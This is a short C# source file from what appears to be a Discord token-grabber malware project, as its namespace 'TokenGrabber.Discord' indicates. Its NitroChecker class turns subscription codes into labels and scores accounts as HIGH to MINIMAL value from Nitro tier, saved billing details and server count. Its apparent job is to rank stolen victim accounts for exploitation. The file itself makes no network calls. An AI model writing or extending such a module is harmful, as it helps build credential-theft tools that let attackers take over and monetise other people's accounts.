namespace TokenGrabber.Discord;

internal static class NitroChecker
{
    public static string GetNitroTypeName(int premiumType) => premiumType switch
    {
        1 => "Nitro Classic",
        2 => "Nitro",
        3 => "Nitro Basic",
        _ => "None"
    };

    public static string GetNitroBadge(int premiumType) => premiumType switch
    {
        1 => "\u2728 Nitro Classic",
        2 => "\uD83D\uDC8E Nitro",
        3 => "\u2B50 Nitro Basic",
        _ => "\u274C No Nitro"
    };

    public static bool IsSubscriptionActive(int premiumType) => premiumType > 0;

    public static string FormatAccountValue(int premiumType, bool hasBilling, int guildCount)
    {
        var score = 0;
        score += premiumType switch { 2 => 50, 1 => 30, 3 => 15, _ => 0 };
        score += hasBilling ? 40 : 0;
        score += Math.Min(guildCount, 100) / 10;

        return score switch
        {
            >= 80 => "HIGH",
            >= 50 => "MEDIUM",
            >= 20 => "LOW",
            _ => "MINIMAL"
        };
    }
}
